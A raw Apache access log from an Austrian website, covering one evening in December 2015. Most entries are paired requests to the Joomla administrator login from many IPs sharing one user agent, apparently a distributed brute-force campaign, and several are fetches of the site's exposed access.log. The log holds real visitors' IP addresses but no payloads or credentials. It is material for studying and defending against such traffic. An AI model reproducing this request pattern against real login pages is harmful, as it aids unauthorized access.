83.237.109.103 - - [12/Dec/2015:21:11:15 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.140.164.122 - - [12/Dec/2015:21:14:51 +0100] "GET /administrator/ HTTP/1.0" 200 4250 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.140.164.122 - - [12/Dec/2015:21:14:52 +0100] "POST /administrator/index.php HTTP/1.0" 200 4481 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.12.28.122 - - [12/Dec/2015:21:16:28 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.12.28.122 - - [12/Dec/2015:21:16:28 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.117 - - [12/Dec/2015:21:18:51 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.117 - - [12/Dec/2015:21:18:51 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
107.168.140.56 - - [12/Dec/2015:21:19:54 +0100] "GET /apache-log/access.log HTTP/1.0" 200 49541 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
83.167.113.100 - - [12/Dec/2015:21:24:36 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [12/Dec/2015:21:24:36 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
80.66.158.8 - - [12/Dec/2015:21:26:04 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
80.66.158.8 - - [12/Dec/2015:21:26:05 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.233.147.245 - - [12/Dec/2015:21:27:26 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.233.147.245 - - [12/Dec/2015:21:27:26 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.164.167.182 - - [12/Dec/2015:21:28:20 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.164.167.182 - - [12/Dec/2015:21:28:20 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.105.39.25 - - [12/Dec/2015:21:31:58 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.105.39.25 - - [12/Dec/2015:21:31:58 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
201.79.97.230 - - [12/Dec/2015:21:34:09 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
201.79.97.230 - - [12/Dec/2015:21:34:09 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
41.33.191.114 - - [12/Dec/2015:21:35:59 +0100] "GET /apache-log/access.log HTTP/1.1" 200 52053 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
46.61.15.146 - - [12/Dec/2015:21:36:45 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.15.146 - - [12/Dec/2015:21:36:45 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
87.159.214.230 - - [12/Dec/2015:21:42:48 +0100] "GET / HTTP/1.1" 200 10479 "http://www.bigfinder.de/?c=ws&q=start&v=1" "T-Online Browser (Windows NT 6.1; de)" "-"
84.18.126.216 - - [12/Dec/2015:21:43:34 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
84.18.126.216 - - [12/Dec/2015:21:43:34 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.123.230.195 - - [12/Dec/2015:21:47:50 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.123.230.195 - - [12/Dec/2015:21:47:50 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
66.249.66.16 - - [12/Dec/2015:21:48:18 +0100] "GET /index.php?option=com_content&view=article&id=46&Itemid=54 HTTP/1.1" 200 8938 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
89.105.140.247 - - [12/Dec/2015:21:48:18 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
89.105.140.247 - - [12/Dec/2015:21:48:19 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.105.13.78 - - [12/Dec/2015:21:48:54 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.105.13.78 - - [12/Dec/2015:21:48:54 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.41.213.58 - - [12/Dec/2015:21:50:29 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.41.213.58 - - [12/Dec/2015:21:50:29 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
92.244.224.113 - - [12/Dec/2015:21:51:52 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
92.244.224.113 - - [12/Dec/2015:21:51:52 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.106.143.62 - - [12/Dec/2015:21:53:39 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.106.143.62 - - [12/Dec/2015:21:53:39 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.204.7.30 - - [12/Dec/2015:21:54:15 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.204.7.30 - - [12/Dec/2015:21:54:15 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
159.182.107.1 - - [12/Dec/2015:21:56:50 +0100] "GET /apache-log/access.log HTTP/1.0" 200 56070 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
91.227.190.44 - - [12/Dec/2015:21:59:33 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.227.190.44 - - [12/Dec/2015:21:59:33 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.117 - - [12/Dec/2015:22:02:03 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.117 - - [12/Dec/2015:22:02:03 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.167.43.54 - - [12/Dec/2015:22:02:47 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.167.43.54 - - [12/Dec/2015:22:02:47 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.227.190.44 - - [12/Dec/2015:22:14:45 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.227.190.44 - - [12/Dec/2015:22:14:45 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.180.164.219 - - [12/Dec/2015:22:15:38 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.180.164.219 - - [12/Dec/2015:22:15:38 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
187.58.71.107 - - [12/Dec/2015:22:16:13 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
187.58.71.107 - - [12/Dec/2015:22:16:14 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.153.135.72 - - [12/Dec/2015:22:19:02 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.153.135.72 - - [12/Dec/2015:22:19:02 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
92.101.154.122 - - [12/Dec/2015:22:20:57 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
92.101.154.122 - - [12/Dec/2015:22:20:57 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.70.41.172 - - [12/Dec/2015:22:22:13 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.70.41.172 - - [12/Dec/2015:22:22:14 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.191.175.165 - - [12/Dec/2015:22:22:15 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.191.175.165 - - [12/Dec/2015:22:22:15 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.0.172.1 - - [12/Dec/2015:22:22:57 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.0.172.1 - - [12/Dec/2015:22:22:57 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.76.34.203 - - [12/Dec/2015:22:24:32 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.76.34.203 - - [12/Dec/2015:22:24:32 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.201.52.125 - - [12/Dec/2015:22:26:32 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.201.52.125 - - [12/Dec/2015:22:26:32 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.192.246.119 - - [12/Dec/2015:22:27:03 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.192.246.119 - - [12/Dec/2015:22:27:03 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
189.13.146.143 - - [12/Dec/2015:22:28:10 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
189.13.146.143 - - [12/Dec/2015:22:28:10 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
89.28.162.61 - - [12/Dec/2015:22:28:47 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
89.28.162.61 - - [12/Dec/2015:22:28:47 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.172.31.79 - - [12/Dec/2015:22:29:01 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.172.31.79 - - [12/Dec/2015:22:29:02 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.230.81.36 - - [12/Dec/2015:22:31:36 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.230.81.36 - - [12/Dec/2015:22:31:36 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
192.227.224.48 - - [12/Dec/2015:22:37:42 +0100] "GET /apache-log/access.log HTTP/1.0" 200 63067 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Iron/29.0.1600.1 Chrome/29.0.1600.1 Safari/537.36" "-"
85.174.39.161 - - [12/Dec/2015:22:38:43 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
85.174.39.161 - - [12/Dec/2015:22:38:43 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.0.172.1 - - [12/Dec/2015:22:39:14 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.0.172.1 - - [12/Dec/2015:22:39:14 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.173.87.93 - - [12/Dec/2015:22:47:22 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.173.87.93 - - [12/Dec/2015:22:47:22 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.78.52.106 - - [12/Dec/2015:22:50:07 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.78.52.106 - - [12/Dec/2015:22:50:07 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
37.78.90.110 - - [12/Dec/2015:22:51:33 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
37.78.90.110 - - [12/Dec/2015:22:51:34 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.123.230.195 - - [12/Dec/2015:22:53:42 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.123.230.195 - - [12/Dec/2015:22:53:42 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
189.13.146.143 - - [12/Dec/2015:22:54:29 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
189.13.146.143 - - [12/Dec/2015:22:54:29 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.86 - - [12/Dec/2015:22:55:13 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.61.242.86 - - [12/Dec/2015:22:55:13 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.157.235.169 - - [12/Dec/2015:23:00:35 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.157.235.169 - - [12/Dec/2015:23:00:35 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.69.0.48 - - [12/Dec/2015:23:02:55 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.69.0.48 - - [12/Dec/2015:23:02:55 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.12.28.122 - - [12/Dec/2015:23:05:53 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.12.28.122 - - [12/Dec/2015:23:05:53 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
185.115.96.41 - - [12/Dec/2015:23:07:53 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
185.115.96.41 - - [12/Dec/2015:23:07:53 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
192.162.27.227 - - [12/Dec/2015:23:13:50 +0100] "GET /apache-log/access.log HTTP/1.0" 200 67817 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Iron/29.0.1600.1 Chrome/29.0.1600.1 Safari/537.36" "-"
109.106.143.62 - - [12/Dec/2015:23:18:19 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.106.143.62 - - [12/Dec/2015:23:18:19 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
77.243.115.178 - - [12/Dec/2015:23:19:23 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
77.243.115.178 - - [12/Dec/2015:23:19:23 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
66.249.66.5 - - [12/Dec/2015:23:24:28 +0100] "GET / HTTP/1.1" 200 10439 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
80.66.158.12 - - [12/Dec/2015:23:28:16 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
80.66.158.12 - - [12/Dec/2015:23:28:17 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [12/Dec/2015:23:32:51 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [12/Dec/2015:23:32:51 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.7.217.50 - - [12/Dec/2015:23:34:36 +0100] "GET /administrator/ HTTP/1.1" 200 4267 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23" "-"
212.7.217.50 - - [12/Dec/2015:23:34:36 +0100] "POST /administrator/index.php HTTP/1.1" 200 4498 "http://www.almhuette-raith.at/administrator/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23" "-"
91.233.165.63 - - [12/Dec/2015:23:39:11 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.233.165.63 - - [12/Dec/2015:23:39:11 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.47.158.158 - - [12/Dec/2015:23:39:23 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.47.158.158 - - [12/Dec/2015:23:39:23 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.98.255.56 - - [12/Dec/2015:23:43:53 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.98.255.56 - - [12/Dec/2015:23:43:54 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.248.180.73 - - [12/Dec/2015:23:45:46 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.248.180.73 - - [12/Dec/2015:23:45:46 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.88.155.223 - - [12/Dec/2015:23:47:21 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.88.155.223 - - [12/Dec/2015:23:47:22 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.19.16.84 - - [12/Dec/2015:23:52:20 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
